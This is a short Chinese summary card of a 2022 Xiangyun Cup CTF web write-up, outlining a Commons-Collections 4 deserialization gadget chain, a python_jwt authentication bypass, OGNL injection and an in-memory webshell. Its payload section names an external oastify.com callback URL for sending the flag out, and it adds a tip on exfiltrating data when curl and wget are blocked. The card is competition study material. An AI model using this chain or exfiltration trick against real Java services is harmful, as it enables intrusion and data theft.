---
title: "第三届\"祥云杯\"CTF初赛WriteUp By EDISEC"
category: web
tags: ["第三届祥云杯初赛", "web", "祥云杯", "ezjava CC4链", "CommonsCollections4 TrAXFilter", "TemplatesImpl"]
signals: ["第三届祥云杯初赛 2022", "祥云杯", "ezjava CC4链", "CommonsCollections4 TrAXFilter", "TemplatesImpl", "Javassist动态类", "DNS外带flag", "python_jwt CVE绕认证", "OGNL注入", "auth_bypass", "Web", "CC4", "Javassist", "DNS"]
difficulty: hard
source: "https://www.ctfiot.com/68739.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第三届"祥云杯"CTF初赛WriteUp By EDISEC

> 赛事：第三届祥云杯初赛 2022 | 方向：web | 难度：hard

## 一句话总结

第三届祥云杯初赛Web：CC4链+Javassist动态类+DNS外带flag+python_jwt绕认证

## 攻击链

1. ezjava:CC4链(ChainedTransformer+TrAXFilter+TemplatesImpl+Javassist)→URL外带flag→FunWEB:python_jwt CVE绕认证→...→内存马+OGNL注入

## 关键 payload

```
CC4:ChainedTransformer(new ConstantTransformer(TrAXFilter.class)+InstantiateTransformer)+TransformingComparator+PriorityQueue;Javassist AbstractTranslet+makeClassInitializer;URL=http://flag.xgh92aja87fsginch3ss2fnklbr7fw.oastify.com/
```

## 经验教训

CC链curl/wget被ban时用URL+HttpURLConnection发GET请求外带flag到oastify

## 标签

祥云杯、ezjava CC4链、CommonsCollections4 TrAXFilter、TemplatesImpl、Javassist动态类、DNS外带flag、python_jwt CVE绕认证、OGNL注入、内存马

## 参考来源

- https://www.ctfiot.com/68739.html
- 原文件：第三届“祥云杯”CTF初赛WriteUp_By_EDISEC.full.md
